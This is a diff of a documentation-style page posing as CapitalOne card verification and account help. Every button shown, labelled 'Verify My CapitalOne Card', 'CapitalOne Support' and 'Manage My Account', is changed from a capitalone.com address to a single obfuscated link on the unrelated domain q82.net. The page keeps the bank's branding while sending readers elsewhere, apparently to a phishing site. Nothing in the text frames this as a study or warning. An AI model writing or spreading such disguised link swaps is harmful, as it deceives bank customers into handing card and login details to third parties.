@@ -6,7 +6,7 @@ Get Started with Secure Access, Rewards, and Online Account Management
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://www.capitalone.com/verify" style="background-color:#007bff; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://q82.net/?5sA8atG1tsAoIIsolQfhgNf2IsZFwx1qZWRrAjzB5LdwMt3vD2oWUJOOaHEzBdPSxKr7mQ7x7BGg39ftrDVwa" style="background-color:#007bff; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Verify My CapitalOne Card
         </a>
     </div>
@@ -92,13 +92,13 @@ Setting up your CapitalOne Verified Credit Card at `capitalone.com/verify <https
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://www.capitalone.com/verify" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://q82.net/?5sA8atG1tsAoIIsolQfhgNf2IsZFwx1qZWRrAjzB5LdwMt3vD2oWUJOOaHEzBdPSxKr7mQ7x7BGg39ftrDVwa" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Verify My Card
         </a>
-        <a href="https://www.capitalone.com/support-center" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://q82.net/?5sA8atG1tsAoIIsolQfhgNf2IsZFwx1qZWRrAjzB5LdwMt3vD2oWUJOOaHEzBdPSxKr7mQ7x7BGg39ftrDVwa" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 CapitalOne Support
         </a>
-        <a href="https://www.capitalone.com/sign-in" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://q82.net/?5sA8atG1tsAoIIsolQfhgNf2IsZFwx1qZWRrAjzB5LdwMt3vD2oWUJOOaHEzBdPSxKr7mQ7x7BGg39ftrDVwa" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
             🔗 Manage My Account
         </a>
     </div>
